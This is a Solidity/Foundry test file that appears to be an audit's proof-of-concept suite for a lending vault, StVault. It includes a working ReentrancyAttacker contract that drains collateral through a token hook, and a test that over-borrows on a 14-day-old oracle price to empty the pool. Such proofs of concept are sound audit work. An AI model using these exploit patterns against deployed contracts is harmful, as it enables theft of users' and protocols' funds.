// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {StVault, IPriceFeed} from "../src/StVault.sol";

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

/// @dev Standard 18-decimal ERC20 used as the stable borrow asset.
contract MockStable is ERC20 {
    constructor() ERC20("Mock USD", "mUSD") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

interface IHookReceiver {
    function onCollateralReceived(uint256 amount) external;
}

/// @dev 18-decimal ERC20 whose transfer notifies a contract recipient
///      (ERC777/ERC1363-style callback). Models a real-world hook token.
contract HookCollateral is ERC20 {
    constructor() ERC20("Hook WETH", "hWETH") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
    function transfer(address to, uint256 value) public override returns (bool) {
        bool ok = super.transfer(to, value);
        if (to.code.length > 0) {
            IHookReceiver(to).onCollateralReceived(value);
        }
        return ok;
    }
}

/// @dev Minimal Chainlink-style aggregator with settable answer / timestamp.
contract MockV3Aggregator {
    uint8 public decimals = 8;
    int256 internal _answer;
    uint256 internal _updatedAt;
    function set(int256 answer, uint256 updatedAt) external {
        _answer = answer;
        _updatedAt = updatedAt;
    }
    function latestRoundData()
        external
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        return (1, _answer, _updatedAt, _updatedAt, 1);
    }
}

/// @dev Attacker contract that re-enters withdrawCollateral via the token hook.
contract ReentrancyAttacker is IHookReceiver {
    StVault public vault;
    HookCollateral public collateral;
    bool internal reentered;

    constructor(StVault _vault, HookCollateral _collateral) {
        vault = _vault;
        collateral = _collateral;
    }

    function deposit(uint256 amount) external {
        collateral.approve(address(vault), amount);
        vault.depositCollateral(amount);
    }

    function attack() external {
        vault.withdrawCollateral();
    }

    function onCollateralReceived(uint256) external override {
        if (!reentered) {
            reentered = true;
            vault.withdrawCollateral(); // re-enter before collateralOf is zeroed
        }
    }
}

// ---------------------------------------------------------------------------
// PoC suite
// ---------------------------------------------------------------------------

contract StVaultPoC is Test {
    StVault internal vault;
    MockStable internal stable;
    HookCollateral internal collateral;
    MockV3Aggregator internal feed;

    function setUp() public {
        vm.warp(400 days); // realistic block.timestamp for staleness math

        stable = new MockStable();
        collateral = new HookCollateral();
        feed = new MockV3Aggregator();

        vault = new StVault(
            IERC20(address(collateral)),
            IERC20(address(stable)),
            IPriceFeed(address(feed))
        );

        // Owner seeds the borrow-asset liquidity pool.
        stable.mint(address(this), 1_000_000e18);
        stable.approve(address(vault), type(uint256).max);
        vault.fund(100_000e18);
    }

    function _depositFor(address user, uint256 amount) internal {
        collateral.mint(user, amount);
        vm.startPrank(user);
        collateral.approve(address(vault), amount);
        vault.depositCollateral(amount);
        vm.stopPrank();
    }

    // [H-01] Unchecked oracle: stale price accepted -> over-borrow -> bad debt
    function test_H01_StaleOracle_DrainsPool() public {
        address mallory = makeAddr("mallory");
        _depositFor(mallory, 10e18);

        // Feed reports $2000/unit, but the data is 14 days old. StVault never
        // validates updatedAt, so the stale price is used as if fresh.
        feed.set(2000e8, block.timestamp - 14 days);
        assertEq(vault.maxBorrow(mallory), 15_000e18, "stale price inflates capacity");

        uint256 poolBefore = stable.balanceOf(address(vault));
        vm.prank(mallory);
        vault.borrow(14_900e18); // succeeds on a 14-day-old price (room left for the 0.5% fee)

        assertEq(stable.balanceOf(mallory), 14_900e18, "attacker extracted borrow asset");
        assertEq(poolBefore - stable.balanceOf(address(vault)), 14_900e18, "pool drained ~15k");

        // True (fresh) price is $100 -> collateral worth 1000, debt 15000 -> bad debt.
        feed.set(100e8, block.timestamp);
        assertEq(vault.collateralValueUsd(mallory), 1_000e18);
        assertLt(
            vault.collateralValueUsd(mallory),
            vault.debtOf(mallory),
            "position underwater: protocol absorbs the loss"
        );
        emit log_named_uint("bad debt (1e18)", vault.debtOf(mallory) - vault.collateralValueUsd(mallory));
    }

    // [M-01] Reentrancy: hook token re-enters withdrawCollateral before zeroing
    function test_M01_Reentrancy_DrainsCollateral() public {
        address victim = makeAddr("victim");
        _depositFor(victim, 10e18);

        ReentrancyAttacker attacker = new ReentrancyAttacker(vault, collateral);
        collateral.mint(address(attacker), 10e18);
        attacker.deposit(10e18);

        assertEq(collateral.balanceOf(address(vault)), 20e18, "vault holds both deposits");

        attacker.attack();

        assertEq(collateral.balanceOf(address(attacker)), 20e18, "attacker took 2x its deposit");
        assertEq(collateral.balanceOf(address(vault)), 0, "vault collateral fully drained");
        assertEq(vault.collateralOf(victim), 10e18, "victim accounting intact but tokens gone");
    }

    // [L-01] Rounding: division-before-multiplication under-charges origination fee
    function test_L01_FeeRounding_UnderCharged() public {
        address user = makeAddr("user");
        _depositFor(user, 100e18);
        feed.set(2000e8, block.timestamp);

        uint256 amount = 2e18 + 9_999; // non-round -> amount/10000 truncates first
        vm.prank(user);
        vault.borrow(amount);

        uint256 chargedFee = vault.debtOf(user) - amount;
        uint256 correctFee = (amount * vault.borrowFeeBps()) / 10_000;
        assertLt(chargedFee, correctFee, "fee under-charged via div-before-mul");

        emit log_named_uint("charged fee (wei)", chargedFee);
        emit log_named_uint("correct fee (wei)", correctFee);
        emit log_named_uint("under-charged by (wei)", correctFee - chargedFee);
    }

    // [Control] With a fresh, correct price the over-borrow reverts -> isolates H-01
    function test_Control_FreshOracle_BoundsBorrow() public {
        address user = makeAddr("user");
        _depositFor(user, 10e18);

        feed.set(100e8, block.timestamp); // true price, fresh
        assertEq(vault.maxBorrow(user), 750e18);

        vm.prank(user);
        vm.expectRevert(bytes("exceeds max LTV"));
        vault.borrow(15_000e18); // the stale-price drain is rejected here
    }
}
